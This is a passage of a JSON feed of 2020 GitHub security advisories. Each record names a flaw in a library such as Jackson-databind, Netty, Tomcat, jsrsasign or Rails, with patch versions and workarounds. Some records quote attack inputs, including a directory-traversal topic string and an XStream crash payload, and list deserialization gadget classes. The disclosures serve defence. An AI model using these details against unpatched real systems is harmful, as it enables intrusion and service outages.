    "description": "### Impact\nPasting content copied from malicious websites into the Froala richeditor could result in a successful self-XSS attack.\n\n### Patches\nIssue has been patched in Build 467 (v1.0.467).\n\n### Workarounds\nApply https://github.com/octobercms/october/commit/b384954a29b89117e1c0d6035b3ede4f46df67c5 to your installation manually if unable to upgrade to Build 467.\n\n### References\n- https://research.securitum.com/the-curious-case-of-copy-paste/\n\n### For more information\nIf you have any questions or comments about this advisory:\n* Email us at [octobercms@luketowers.ca](mailto:octobercms@luketowers.ca) & [hello@octobercms.com](mailto:hello@octobercms.com)\n\n### Threat Assessment\nAssessed as Low given that by the nature of the attack it can only impact users that do it to themselves by copying and pasting from malicious websites.\n\n### Acknowledgements\n\nThanks to [Michał Bentkowski of Securitum](https://research.securitum.com/authors/michal-bentkowski/) for finding the original issue in Froala and @tomaszstrojny for reporting the issue to the October CMS team.",
    "summary": "Cross-site Scripting in October"
  },
  {
    "ghsaId": "GHSA-9qcf-c26r-x5rf",
    "publishedAt": "2020-07-01T17:55:03Z",
    "description": "initDocumentParser in xml/XMLSchedulingDataProcessor.java in Terracotta Quartz Scheduler through 2.3.0 allows XXE attacks via a job description.",
    "summary": "XML external entity injection in Terracotta Quartz Scheduler"
  },
  {
    "ghsaId": "GHSA-5x3v-2gxr-59m2",
    "publishedAt": "2020-07-01T17:26:15Z",
    "description": "In Apache RocketMQ 4.2.0 to 4.6.0, when the automatic topic creation in the broker is turned on by default, an evil topic like “../../../../topic2020” is sent from rocketmq-client to the broker, a topic folder will be created in the parent directory in brokers, which leads to a directory traversal vulnerability. Users of the affected versions should apply one of the following: Upgrade to Apache RocketMQ 4.6.1 or later.",
    "summary": "Directory traversal in Apache RocketMQ"
  },
  {
    "ghsaId": "GHSA-jcq3-cprp-m333",
    "publishedAt": "2020-07-01T17:12:20Z",
    "description": "Vulnerability in the MySQL Connectors component of Oracle MySQL (subcomponent: Connector/J). Supported versions that are affected are 8.0.15 and prior. Difficult to exploit vulnerability allows high privileged attacker with logon to the infrastructure where MySQL Connectors executes to compromise MySQL Connectors. Successful attacks require human interaction from a person other than the attacker. Successful attacks of this vulnerability can result in takeover of MySQL Connectors. CVSS 3.0 Base Score 6.3 (Confidentiality, Integrity and Availability impacts). CVSS Vector: (CVSS:3.0/AV:L/AC:H/PR:H/UI:R/S:U/C:H/I:H/A:H).",
    "summary": "Privilege escalation in mysql-connector-jav"
  },
  {
    "ghsaId": "GHSA-7hwc-46rm-65jh",
    "publishedAt": "2020-06-30T22:48:24Z",
    "description": "XStream through 1.4.9, when a certain denyTypes workaround is not used, mishandles attempts to create an instance of the primitive type 'void' during unmarshalling, leading to a remote application crash, as demonstrated by an xstream.fromXML(\"<void/>\") call.",
    "summary": "Denial of service in XStream"
  },
  {
    "ghsaId": "GHSA-rgh3-987h-wpmw",
    "publishedAt": "2020-06-30T22:48:14Z",
    "description": "Multiple XML external entity (XXE) vulnerabilities in the (1) Dom4JDriver, (2) DomDriver, (3) JDomDriver, (4) JDom2Driver, (5) SjsxpDriver, (6) StandardStaxDriver, and (7) WstxDriver drivers in XStream before 1.4.9 allow remote attackers to read arbitrary files via a crafted XML document.",
    "summary": "XML External Entity Injection in XStream"
  },
  {
    "ghsaId": "GHSA-9959-6p3m-wxpc",
    "publishedAt": "2020-06-30T21:01:31Z",
    "description": "The SslHandler in Netty before 3.9.2 allows remote attackers to cause a denial of service (infinite loop and CPU consumption) via a crafted SSLv2Hello message.",
    "summary": "Denial of service in Netty"
  },
  {
    "ghsaId": "GHSA-xfv3-rrfm-f2rv",
    "publishedAt": "2020-06-30T21:01:21Z",
    "description": "Netty before 3.9.8.Final, 3.10.x before 3.10.3.Final, 4.0.x before 4.0.28.Final, and 4.1.x before 4.1.0.Beta5 and Play Framework 2.x before 2.3.9 might allow remote attackers to bypass the httpOnly flag on cookies and obtain sensitive information by leveraging improper validation of cookie name and value characters.",
    "summary": "Information Exposure in Netty"
  },
  {
    "ghsaId": "GHSA-w3f4-3q6j-rh82",
    "publishedAt": "2020-06-30T20:40:50Z",
    "description": "FasterXML jackson-databind through 2.8.11 and 2.9.x through 2.9.3 allows unauthenticated remote code execution because of an incomplete fix for the CVE-2017-7525 and CVE-2017-17485 deserialization flaws. This is exploitable via two different gadgets that bypass a blacklist.",
    "summary": "Deserialization of Untrusted Data in jackson-databind"
  },
  {
    "ghsaId": "GHSA-f6pc-crhh-cp96",
    "publishedAt": "2020-06-30T16:33:23Z",
    "description": "### Affected\nThis affects Presto server installations. This does NOT affect clients such as the CLI or JDBC driver.\n\n### Impact\nAuthenticated users can bypass authorization checks by directly accessing internal APIs. This impacts Presto server installations with secure internal communication configured.\n\nThis does not affect installations that have not configured secure internal communication, as these installations are inherently insecure.\n\n### Patches\nThis issue has been fixed starting with version 337.\n\n### Workarounds\nThis issue can be mitigated by blocking network access to internal APIs on the coordinator and workers. \n\n### References\nSee the Presto documentation for [Secure Internal Communication](https://prestosql.io/docs/current/security/internal-communication.html).\n\n### For more information\nIf you have any questions or comments about this advisory:\n* Join the **#security** channel on [Slack](https://prestosql.io/slack.html).\n* Contact the security team at [security@prestosql.io](mailto:security@prestosql.io).",
    "summary": "Privilege escalation in Presto"
  },
  {
    "ghsaId": "GHSA-6g6m-m6h5-w9gf",
    "publishedAt": "2020-06-30T16:05:24Z",
    "description": "### Overview\nVersions before and including 5.3.3, we are not enforcing the **algorithms** entry to be specified in the configuration.\nWhen **algorithms** is not specified in the configuration, with the combination of jwks-rsa, it may lead to authorization bypass. \n\n### Am I affected?\nYou are affected by this vulnerability if all of the following conditions apply:\n\nYou are using express-jwt\nAND \nYou do not have **algorithms**  configured in your express-jwt configuration.\nAND\nYou are using libraries such as jwks-rsa as the **secret**. \n\n### How to fix that?\nSpecify **algorithms** in the express-jwt configuration. The following is an example of a proper configuration\n\n``` \nconst checkJwt = jwt({\n  secret: jwksRsa.expressJwtSecret({\n    rateLimit: true,\n    jwksRequestsPerMinute: 5,\n    jwksUri: `https://${DOMAIN}/.well-known/jwks.json`\n  }),\n  // Validate the audience and the issuer.\n  audience: process.env.AUDIENCE,\n  issuer: `https://${DOMAIN}/`,\n  // restrict allowed algorithms\n  algorithms: ['RS256']\n}); \n```\n\n### Will this update impact my users?\nThe fix provided in patch will not affect your users if you specified the algorithms allowed. The patch now makes **algorithms** a required configuration. \n\n\n### Credit\nIST Group",
    "summary": "Authorization bypass in express-jwt"
  },
  {
    "ghsaId": "GHSA-g753-jx37-7xwh",
    "publishedAt": "2020-06-30T16:05:08Z",
    "description": "### Impact\nECDSA side-channel attack named [Minerava](https://minerva.crocs.fi.muni.cz/) have been found and it was found that it affects to jsrsasign.\n\nExecution time of thousands signature generation have been observed then EC private key which is scalar value may be recovered since point and scalar multiplication time depends on bits of scalar. In jsrsasign 8.0.13 or later, execution time of EC point and scalar multiplication is almost constant and fixed for the issue.\n\n- Minerva is one of timing attack or side channel attack for EC.\n- If you don't use ECDSA class, you are not affected the vulnerability.\n- The vulnerability is that attacker may guess private key by checking processing time of EC key generation or ECDSA signing.\n- The cause issue is that point multiplication processing time in ECDSA signing is depends on private key value.\n- After 8.0.13, processing time of point multiplication in ECDSA signing have become constant for key value in theory.\n\n### Patches\nUsers using ECDSA signature generation should upgrade to 8.0.13 or later.\n\n### Workarounds\nThere is no workarounds in jsrsasign. Update jsrsasign or use other ECDSA library.\n\n### ACKNOWLEDGEMENT\nThanks to Jan Jancar @J08nY, Petr Svenda and Vladimir Sedlacek of Masaryk University in Czech Republic to find and report this vulnerability.\n\n### References\nhttps://minerva.crocs.fi.muni.cz/\nhttps://www.npmjs.com/advisories/1505\nhttps://github.com/kjur/jsrsasign/issues/411",
    "summary": "ECDSA signature vulnerability of Minerva timing attack in jsrsasign"
  },
  {
    "ghsaId": "GHSA-p8c3-7rj8-q963",
    "publishedAt": "2020-06-26T16:54:15Z",
    "description": "### Impact\nJsrsasign supports ECDSA signature validation which signature value is represented by ASN.1 DER encoding. This vulnerablity may accept a wrong ASN.1 DER encoded ECDSA signature such as:\n\n- wrong multi-byte ASN.1 length of TLV (ex. 0x820045 even though 0x45 is correct)\n- prepending zeros with ASN.1 INTEGER value (ex. 0x00000123 even though 0x0123 is correct)\n- appending zeros to signature of ASN.1 TLV (ex. 0x3082....1fbc000000 even though 0x3082....1fbc, appending zeros are ignored.)\n\nThis vulnerability was fixed by strict ASN.1 DER checking. \n\nHere is an assessment of this vulnerability:\n\n- If you are not use ECDSA signature validation, this vulnerability is not affected.\n- Not ASN.1 format signature like just concatenation of R and S value is not affected such as Bitcoin.\n- This vulnerability is affected to all ECC curve parameters.\n- Risk to accept a forged or crafted message to be signed is low.\n- Risk to raise memory corruption is low since jsrsasign uses BigInteger class.\n- ECDSA signatures semantically the same to valid one may be accepted as valid. There are many malleable variants.\n\nAs discussed [here](https://crypto.stackexchange.com/questions/24862/ber-or-der-x9-62-for-ecdsa-signature), there is no standards like X9.62 which requires ASN.1 DER. So ASN.1 BER can be applied to ECDSA however most of implementations like OpenSSL do strict ASN.1 DER checking.\n\n### Patches\nUsers using ECDSA signature validation should upgrade to 8.0.19.\n\n### Workarounds\nDo strict ASN.1 DER checking for ASN.1 encoded ECDSA signature value.",
    "summary": "ECDSA signature validation vulnerability by accepting wrong ASN.1 encoding in jsrsasign"
  },
  {
    "ghsaId": "GHSA-j3rh-8vwq-wh84",
    "publishedAt": "2020-06-26T16:48:13Z",
    "description": "JHipster Kotlin is using an insecure source of randomness to generate all of it's random values. JHipster Kotlin relies upon apache commons lang3 `RandomStringUtils`.\n\nFrom the documentation:\n\n> Caveat: Instances of Random, upon which the implementation of this class relies, are not cryptographically secure.\n> \\- https://commons.apache.org/proper/commons-lang/javadocs/api-3.9/org/apache/commons/lang3/RandomStringUtils.html\n\nHere are the examples of JHipster Kotlin'ss use of an insecure PRNG:\n\nhttps://github.com/jhipster/jhipster-kotlin/blob/193ae8f13c0be686f9687e78bacfedb144c47d8c/generators/server/templates/src/main/kotlin/package/service/util/RandomUtil.kt.ejs#L32\n\n## Proof Of Concepts Already Exist\n\nThere has been a POC of taking one RNG value generated `RandomStringUtils` and reversing it to generate all of the past/future RNG values public since March 3rd, 2018.\n\nhttps://medium.com/@alex91ar/the-java-soothsayer-a-practical-application-for-insecure-randomness-c67b0cd148cd\n\nPOC Repository: https://github.com/alex91ar/randomstringutils\n\n\n## Potential Impact Technical\n\nAll that is required is to get one password reset token from a JHipster Kotlin generated service and using the POC above, you can reverse what all future password reset tokens to be generated by this server. This allows an attacker to pick and choose what account they would like to takeover by sending account password reset requests for targeted accounts.\n\n## Potential Impact Scale\n\nNot as large as for the original jhipster project as the kotlin blueprint is not that widely used.\n\n### Patches\n\nUpdate your generated applications to > 1.2.0\n\n### Workarounds\n\nChange the content of `RandomUtil.kt` like this:\n\n```kotlin\nimport java.security.SecureRandom\nimport org.apache.commons.lang3.RandomStringUtils\n\nprivate const val DEF_COUNT = 20\n\nobject RandomUtil {\n    private val secureRandom: SecureRandom = SecureRandom()\n\n    init {\n        secureRandom.nextBytes(byteArrayOf(64.toByte()))\n    }\n\n    private fun generateRandomAlphanumericString(): String {\n        return RandomStringUtils.random(DEF_COUNT, 0, 0, true, true, null, secureRandom)\n    }\n\n    /**\n    * Generate a password.\n    *\n    * @return the generated password.\n    */\n    fun generatePassword(): String = generateRandomAlphanumericString()\n}\n```\n\nImportant is to exchange **every** call of `RandomStringUtils.randomAlphaNumeric`.\n\n\n\n### For more information\n\nIf you have any questions or comments about this advisory:\n* Open an issue in [JHipster Kotlin](https://github.com/jhipster/jhipster-kotlin)",
    "summary": "Use of Cryptographically Weak Pseudo-Random Number Generator in JHipster Kotlin"
  },
  {
    "ghsaId": "GHSA-xxxq-chmp-67g4",
    "publishedAt": "2020-06-26T16:27:08Z",
    "description": "### Impact\nJsrsasign supports RSA PKCS#1 v1.5 (i.e. RSAES-PKCS1-v1_5) encryption and decryption. Its encrypted message is represented as BigInteger. When there is a valid encrypted message, a crafted message with prepending zeros can be decrypted by this vulnerability.\n\n- If you don't use RSA PKCS#1 decryption, this vulnerability is not affected.\n- Risk to forge contents of encrypted message is very low.\n- Risk to raise memory corruption is low since jsrsasign uses BigInteger class.\n\n### Patches\nUsers using RSA PKCS#1 v1.5 decryption should upgrade to 8.0.18.\n\n### Workarounds\nReject RSA PKCS#1 v1.5 encrypted message with unnecessary prepending zeros.",
    "summary": "RSA PKCS#1 decryption vulnerability with prepending zeros in jsrsasign"
  },
  {
    "ghsaId": "GHSA-q3gh-5r98-j4h3",
    "publishedAt": "2020-06-26T16:26:50Z",
    "description": "### Impact\nJsrsasign can verify RSA-PSS signature which value can expressed as BigInteger. When there is a valid RSA-PSS signature value, this vulnerability is also accept value with prepending zeros as a valid signature.\n\n- If you are not use RSA-PSS signature validation, this vulnerability is not affected. \n- Risk to accept a forged or crafted message to be signed is low.\n- Risk to raise memory corruption is low since jsrsasign uses BigInteger class.\n\n### Patches\nUsers using RSA-PSS signature validation should upgrade to 8.0.17.\n\n### Workarounds\nReject RSA-PSS signatures with unnecessary prepending zeros.",
    "summary": "RSA-PSS signature validation vulnerability by prepending zeros in jsrsasign"
  },
  {
    "ghsaId": "GHSA-pfxf-wh96-fvjc",
    "publishedAt": "2020-06-25T20:02:51Z",
    "description": "### Impact\n\nWe log the mail for invalid password reset attempts. \nAs the email is provided by a user and the api is public this can be used by an attacker to forge log entries.\nThis is vulnerable to https://cwe.mitre.org/data/definitions/117.html\n\nThis problem affects only application generated with jwt or session authentication. Applications using oauth are not vulnerable.\n\n### Patches\n\nversion 1.7.0.\n\n### Workarounds\n\nIn `AccountResource.kt` you should change the line\n\n```kotlin\n log.warn(\"Password reset requested for non existing mail '$mail'\");\n```\n\nto \n\n```kotlin\n log.warn(\"Password reset requested for non existing mail\");\n```\n\n### References\n\n* https://cwe.mitre.org/data/definitions/117.html\n* https://owasp.org/www-community/attacks/Log_Injection\n* https://www.baeldung.com/jvm-log-forging\n\n### For more information\nIf you have any questions or comments about this advisory:\n* Open an issue in [jhipster kotlin](https://github.com/jhipster/jhipster-kotlin)",
    "summary": "Log Forging in generator-jhipster-kotlin"
  },
  {
    "ghsaId": "GHSA-c6qr-h5vq-59jc",
    "publishedAt": "2020-06-24T17:40:33Z",
    "description": "There is a vulnerability in versions of Rails prior to 6.0.3.2 that allowed\nan untrusted user to run any pending migrations on a Rails app running in\nproduction.\n\nThis vulnerability has been assigned the CVE identifier CVE-2020-8185.\n\nVersions Affected:  6.0.0 < rails < 6.0.3.2\nNot affected:       Applications with `config.action_dispatch.show_exceptions = false` (this is not a default setting in production)\nFixed Versions:     rails >= 6.0.3.2\n\nImpact\n------\n\nUsing this issue, an attacker would be able to execute any migrations that\nare pending for a Rails app running in production mode. It is important to\nnote that an attacker is limited to running migrations the application\ndeveloper has already defined in their application and ones that have not\nalready ran.\n\nWorkarounds\n-----------\n\nUntil such time as the patch can be applied, application developers should\ndisable the ActionDispatch middleware in their production environment via\na line such as this one in their config/environment/production.rb:\n\n`config.middleware.delete ActionDispatch::ActionableExceptions`",
    "summary": "Untrusted users can run pending migrations in production in Rails"
  },
  {
    "ghsaId": "GHSA-6r3c-8xf3-ggrr",
    "publishedAt": "2020-06-24T17:15:26Z",
    "description": "django-sendfile2 currently relies on the backend to correctly limit file paths to `SENDFILE_ROOT`. This is not the case for the `simple` and `development` backends, it is also not necessarily the case for any of the other backends either (it's just an assumption that was made by the original author).\n\nThis will be fixed in 0.6.0 which is to be released the same day as this advisory is made public.\n\nWhen upgrading, you will need to make sure `SENDFILE_ROOT` is set in your settings module if it wasn't already.",
    "summary": "Directory traversal outside of SENDFILE_ROOT in django-sendfile2"
  },
  {
    "ghsaId": "GHSA-j6w9-fv6q-3q52",
    "publishedAt": "2020-06-24T17:15:00Z",
    "description": "A reliance on cookies without validation/integrity check security vulnerability exists in rack < 2.2.3, rack < 2.1.4 that makes it is possible for an attacker to forge a secure or host-only cookie prefix.",
    "summary": "Percent-encoded cookies can be used to overwrite existing prefixed cookie names"
  },
  {
    "ghsaId": "GHSA-m38j-pmg3-v5x5",
    "publishedAt": "2020-06-23T19:58:27Z",
    "description": "### Impact\n\nPotential timing attack exists on websites where the basic authentication is used or configured, i.e. `BASIC_AUTH_LOGIN` and `BASIC_AUTH_PASSWORD` is set. Currently the string comparison between configured credentials and the ones provided by users is performed through a character-by-character string comparison. This enables a possibility that attacker may time the time it takes the server to validate different usernames and password, and use this knowledge to work out the valid credentials. This attack is understood not to be realistic over the Internet. However, it may be achieved from within local networks where the website is hosted, e.g. from inside a data centre where a website's server is located.\n\nSites protected by IP address whitelisting only are unaffected by this vulnerability.\n\n### Patches\nThis vulnerability has been fixed on version 0.3.4 of django-basic-auth-ip-whitelist. Update to version 0.3.4 as soon as possible and change basic authentication username and password configured on a Django project using this package.\n\n### Workarounds\nStop using basic authentication and use the IP whitelisting component only. It can be achieved by not setting `BASIC_AUTH_LOGIN` and `BASIC_AUTH_PASSWORD` in Django project settings.\n\n### References\n\n- [Django mailing list discussion](https://groups.google.com/forum/#!msg/django-developers/iAaq0pvHXuA/fpUuwjK3i2wJ)\n\n### For more information\nIf you have any questions or comments about this advisory:\n* Open an issue at https://github.com/tm-kn/django-basic-auth-ip-whitelist/issues\n* Email us at the email specified on the [security policy](https://github.com/tm-kn/django-basic-auth-ip-whitelist/security/policy).\n\n### Acknowledgements\n\nThanks to Thibaud Colas for reporting this.",
    "summary": "Timing attack on django-basic-auth-ip-whitelist"
  },
  {
    "ghsaId": "GHSA-77qv-gh6f-pgh4",
    "publishedAt": "2020-06-22T15:24:06Z",
    "description": "### Impact\nThe `trainBatch` function has a command injection vulnerability. Clients of the Limdu library are unlikely to be aware of this, so they might unwittingly write code that contains a vulnerability.\n\n### Patches\nPatched in version 0.95.\n\n### Workarounds\nDo not use trainBatch with classifiers that rely on shell execution, such as SVM Perf, SVM Linear or Adaboost\n\n### References\nNo",
    "summary": "Command Injection in Limdu"
  },
  {
    "ghsaId": "GHSA-v4rh-8p82-6h5w",
    "publishedAt": "2020-06-22T14:39:03Z",
    "description": "all versions of url-regex are vulnerable to Regular Expression Denial of Service. An attacker providing a very long string in String.test can cause a Denial of Service.",
    "summary": "Regular expression denial of service in url-regex"
  },
  {
    "ghsaId": "GHSA-qjg4-w4c6-f6c6",
    "publishedAt": "2020-06-18T19:23:17Z",
    "description": "### Impact\nThis issue may lead to remote code execution if a client of the library calls the vulnerable method with untrusted input.\n\n### Patches\nPatched by version 2.0.0. Previous releases are deprecated in npm.\n\n### Workarounds\nMake sure to escape git commit messages when using the commitMessage option for the update function.",
    "summary": "Command injection in mversion"
  },
  {
    "ghsaId": "GHSA-c2q3-4qrh-fm48",
    "publishedAt": "2020-06-18T14:44:50Z",
    "description": "FasterXML jackson-databind 2.x before 2.9.10.5 mishandles the interaction between serialization gadgets and typing, related to oracle.jms.AQjmsQueueConnectionFactory, oracle.jms.AQjmsXATopicConnectionFactory, oracle.jms.AQjmsTopicConnectionFactory, oracle.jms.AQjmsXAQueueConnectionFactory, and oracle.jms.AQjmsXAConnectionFactory (aka weblogic/oracle-aqjms).",
    "summary": "Deserialization of untrusted data in Jackson Databind"
  },
  {
    "ghsaId": "GHSA-c265-37vj-cwcc",
    "publishedAt": "2020-06-18T14:44:48Z",
    "description": "FasterXML jackson-databind 2.x before 2.9.10.5 mishandles the interaction between serialization gadgets and typing, related to com.sun.org.apache.xalan.internal.lib.sql.JNDIConnectionPool (aka xalan2).",
    "summary": "Deserialization of untrusted data in Jackson Databind"
  },
  {
    "ghsaId": "GHSA-j823-4qch-3rgm",
    "publishedAt": "2020-06-18T14:44:46Z",
    "description": "FasterXML jackson-databind 2.x before 2.9.10.5 mishandles the interaction between serialization gadgets and typing, related to oadd.org.apache.xalan.lib.sql.JNDIConnectionPool (aka apache/drill).",
    "summary": "Deserialization of untrusted data in Jackson Databind"
  },
  {
    "ghsaId": "GHSA-mc6h-4qgp-37qh",
    "publishedAt": "2020-06-18T14:44:43Z",
    "description": "FasterXML jackson-databind 2.x before 2.9.10.5 mishandles the interaction between serialization gadgets and typing, related to org.jsecurity.realm.jndi.JndiRealmFactory (aka org.jsecurity).",
    "summary": "Deserialization of untrusted data in Jackson Databind"
  },
  {
    "ghsaId": "GHSA-mhp6-pxh8-r675",
    "publishedAt": "2020-06-18T14:19:58Z",
    "description": "angular.js prior to 1.8.0 allows cross site scripting. The regex-based input HTML replacement may turn sanitized code into unsanitized one. Wrapping \"<option>\" elements in \"<select>\" ones changes parsing behavior, leading to possibly unsanitizing code.",
    "summary": "Cross site scripting in Angular"
  },
  {
    "ghsaId": "GHSA-p4x4-rw2p-8j8m",
    "publishedAt": "2020-06-16T22:08:06Z",
    "description": "When HTML is sanitized using Sanitize's \"relaxed\" config or a custom config that allows certain elements, some content in a `<math>` or `<svg>` element may not be sanitized correctly even if `math` and `svg` are not in the allowlist.\n\nYou are likely to be vulnerable to this issue if you use Sanitize's relaxed config or a custom config that allows one or more of the following HTML elements:\n\n- `iframe`\n- `math`\n- `noembed`\n- `noframes`\n- `noscript`\n- `plaintext`\n- `script`\n- `style`\n- `svg`\n- `xmp`\n\n### Impact\n\nUsing carefully crafted input, an attacker may be able to sneak arbitrary HTML through Sanitize, potentially resulting in XSS (cross-site scripting) or other undesired behavior when that HTML is rendered in a browser.\n\n### Releases\n\nThis problem has been fixed in Sanitize 5.2.1.\n\n### Workarounds\n\nIf upgrading is not possible, a workaround is to override the default value of Sanitize's `:remove_contents` config option with the following value, which ensures that the contents of `math` and `svg` elements (among others) are removed entirely when those elements are not in the allowlist:\n\n```ruby\n%w[iframe math noembed noframes noscript plaintext script style svg xmp]\n```\n\nFor example, if you currently use Sanitize's relaxed config, you can create a custom config object that overrides the default value of `:remove_contents` like this:\n\n```ruby\ncustom_config = Sanitize::Config.merge(\n  Sanitize::Config::RELAXED,\n  :remove_contents => %w[iframe math noembed noframes noscript plaintext script style svg xmp]\n)\n```\n\nYou would then pass this custom config to Sanitize when sanitizing HTML.\n\n### For more information\n\nIf you have any questions or comments about this advisory:\n\n- Open an issue in the [Sanitize repo](https://github.com/rgrove/sanitize).\n- See Sanitize's [security policy](https://github.com/rgrove/sanitize/security/policy).\n\n### Credits\n\nMany thanks to Michał Bentkowski of Securitum for reporting this bug and helping to verify the fix.\n\n### References\n\n- [GHSA-p4x4-rw2p-8j8m](https://github.com/rgrove/sanitize/security/advisories/GHSA-p4x4-rw2p-8j8m)\n- [CVE-2020-4054](https://nvd.nist.gov/vuln/detail/CVE-2020-4054)\n- https://github.com/rgrove/sanitize/releases/tag/v5.2.1",
    "summary": "Cross-site Scripting in Sanitize "
  },
  {
    "ghsaId": "GHSA-cxjc-r2fp-7mq6",
    "publishedAt": "2020-06-15T21:53:12Z",
    "description": "### Impact\nXSS possible for users of the Dijit Editor's LinkDialog plugin\n\n### Patches\nYes, 1.11.11, 1.12.9, 1.13.8, 1.14.7, 1.15.4, 1.16.3\n\n### Workarounds\nUsers may apply the patch made in these releases.\n\n\n### For more information\nIf you have any questions or comments about this advisory, open an issue in [dojo/dijit](https://github.com/dojo/dijit/)",
    "summary": "XSS in dijit editor's LinkDialog plugin "
  },
  {
    "ghsaId": "GHSA-6hgm-866r-3cjv",
    "publishedAt": "2020-06-15T20:36:20Z",
    "description": "Serialized-object interfaces in Java applications using the Apache Commons Collections (ACC) library may allow remote attackers to execute arbitrary commands via a crafted serialized Java object.",
    "summary": "Insecure Deserialization in Apache Commons Collection"
  },
  {
    "ghsaId": "GHSA-6phf-73q6-gh87",
    "publishedAt": "2020-06-15T20:36:17Z",
    "description": "In Apache Commons Beanutils 1.9.2, a special BeanIntrospector class was added which allows suppressing the ability for an attacker to access the classloader via the class property available on all Java objects. We, however were not using this by default characteristic of the PropertyUtilsBean.",
    "summary": "Insecure Deserialization in Apache Commons Beanutils"
  },
  {
    "ghsaId": "GHSA-mvr2-9pj6-7w5j",
    "publishedAt": "2020-06-15T20:35:11Z",
    "description": "Unbounded memory allocation in Google Guava 11.0 through 24.x before 24.1.1 allows remote attackers to conduct denial of service attacks against servers that depend on this library and deserialize attacker-provided data, because the AtomicDoubleArray class (when serialized with Java serialization) and the CompoundOrdering class (when serialized with GWT serialization) perform eager allocation without appropriate checks on what a client has sent and whether the data size is reasonable.",
    "summary": "Denial of Service in Google Guava"
  },
  {
    "ghsaId": "GHSA-xxgp-pcfc-3vgc",
    "publishedAt": "2020-06-15T19:57:48Z",
    "description": "In Hibernate Validator 5.2.x before 5.2.5 final, 5.3.x, and 5.4.x, it was found that when the security manager's reflective permissions, which allows it to access the private members of the class, are granted to Hibernate Validator, a potential privilege escalation can occur. By allowing the calling code to access those private members without the permission an attacker may be able to validate an invalid instance and access the private member value via ConstraintViolation#getInvalidValue().",
    "summary": "Privilege Escalation in Hibernate Validator"
  },
  {
    "ghsaId": "GHSA-mm9x-g8pc-w292",
    "publishedAt": "2020-06-15T19:36:16Z",
    "description": "The ZlibDecoders in Netty 4.1.x before 4.1.46 allow for unbounded memory allocation while decoding a ZlibEncoded byte stream. An attacker could send a large ZlibEncoded byte stream to the Netty server, forcing the server to allocate all of its free memory to a single decoder.",
    "summary": "Denial of Service in Netty"
  },
  {
    "ghsaId": "GHSA-ffvq-7w96-97p7",
    "publishedAt": "2020-06-15T19:34:50Z",
    "description": "Spring Framework, version 5.1, versions 5.0.x prior to 5.0.10, versions 4.3.x prior to 4.3.20, and older unsupported versions on the 4.2.x branch provide support for range requests when serving static resources through the ResourceHttpRequestHandler, or starting in 5.0 when an annotated controller returns an org.springframework.core.io.Resource. A malicious user (or attacker) can add a range header with a high number of ranges, or with wide ranges that overlap, or both, for a denial of service attack. This vulnerability affects applications that depend on either spring-webmvc or spring-webflux. Such applications must also have a registration for serving static resources (e.g. JS, CSS, images, and others), or have an annotated controller that returns an org.springframework.core.io.Resource. Spring Boot applications that depend on spring-boot-starter-web or spring-boot-starter-webflux are ready to serve static resources out of the box and are therefore vulnerable.",
    "summary": "Denial of Service in Spring Framework"
  },
  {
    "ghsaId": "GHSA-2ppp-9496-p23q",
    "publishedAt": "2020-06-15T19:34:31Z",
    "description": "Spring Security versions 5.3.x prior to 5.3.2, 5.2.x prior to 5.2.4, 5.1.x prior to 5.1.10, 5.0.x prior to 5.0.16 and 4.2.x prior to 4.2.16 use a fixed null initialization vector with CBC Mode in the implementation of the queryable text encryptor. A malicious user with access to the data that has been encrypted using such an encryptor may be able to derive the unencrypted values using a dictionary attack.",
    "summary": "Insufficient Entropy in Spring Security"
  },
  {
    "ghsaId": "GHSA-vmqm-g3vh-847m",
    "publishedAt": "2020-06-15T18:51:38Z",
    "description": "Apache Xerces2 Java Parser before 2.12.0 allows remote attackers to cause a denial of service (CPU consumption) via a crafted message to an XML service, which triggers hash table collisions.",
    "summary": "Denial of service in Apache Xerces2"
  },
  {
    "ghsaId": "GHSA-334p-wv2m-w3vp",
    "publishedAt": "2020-06-15T18:51:30Z",
    "description": "XMLScanner.java in Apache Xerces2 Java, as used in Sun Java Runtime Environment (JRE) in JDK and JRE 6 before Update 15 and JDK and JRE 5.0 before Update 20, and in other products, allows remote attackers to cause a denial of service (infinite loop and application hang) via malformed XML input, as demonstrated by the Codenomicon XML fuzzing framework.",
    "summary": "Denial of service in Apache Xerces2"
  },
  {
    "ghsaId": "GHSA-c9hw-wf7x-jp9j",
    "publishedAt": "2020-06-15T18:51:21Z",
    "description": "When using the Apache JServ Protocol (AJP), care must be taken when trusting incoming connections to Apache Tomcat. Tomcat treats AJP connections as having higher trust than, for example, a similar HTTP connection. If such connections are available to an attacker, they can be exploited in ways that may be surprising. In Apache Tomcat 9.0.0.M1 to 9.0.0.30, 8.5.0 to 8.5.50 and 7.0.0 to 7.0.99, Tomcat shipped with an AJP Connector enabled by default that listened on all configured IP addresses. It was expected (and recommended in the security guide) that this Connector would be disabled if not required. This vulnerability report identified a mechanism that allowed: - returning arbitrary files from anywhere in the web application - processing any file in the web application as a JSP Further, if the web application allowed file upload and stored those files within the web application (or the attacker was able to control the content of the web application by some other means) then this, along with the ability to process a file as a JSP, made remote code execution possible. It is important to note that mitigation is only required if an AJP port is accessible to untrusted users. Users wishing to take a defence-in-depth approach and block the vector that permits returning arbitrary files and execution as JSP may upgrade to Apache Tomcat 9.0.31, 8.5.51 or 7.0.100 or later. A number of changes were made to the default AJP Connector configuration in 9.0.31 to harden the default configuration. It is likely that users upgrading to 9.0.31, 8.5.51 or 7.0.100 or later will need to make small changes to their configurations.",
    "summary": "Improper Input Validation in Tomcat"
  },
  {
    "ghsaId": "GHSA-qcxh-w3j9-58qr",
    "publishedAt": "2020-06-15T18:51:09Z",
    "description": "The HTTP/2 implementation in Apache Tomcat 9.0.0.M1 to 9.0.14 and 8.5.0 to 8.5.37 accepted streams with excessive numbers of SETTINGS frames and also permitted clients to keep streams open without reading/writing request/response data. By keeping streams open for requests that utilised the Servlet API's blocking I/O, clients were able to cause server-side threads to block eventually leading to thread exhaustion and a DoS.",
    "summary": "Denial of Service in Tomcat"
  },
  {
    "ghsaId": "GHSA-wrr7-33fx-rcvj",
    "publishedAt": "2020-06-15T18:44:56Z",
    "description": "**Withdrawn:** Duplicate of GHSA-cjjf-94ff-43w7",
    "summary": "Deserialization of Untrusted Data in jackson-databind"
  },
  {
    "ghsaId": "GHSA-6wqp-v4v6-c87c",
    "publishedAt": "2020-06-15T18:44:51Z",
    "description": "An issue was discovered in FasterXML jackson-databind prior to 2.7.9.4, 2.8.11.2, and 2.9.6. When Default Typing is enabled (either globally or for a specific property), the service has the Oracle JDBC jar in the classpath, and an attacker can provide an LDAP service to access, it is possible to make the service execute a malicious payload.",
    "summary": "Deserialization of Untrusted Data"
  },
  {
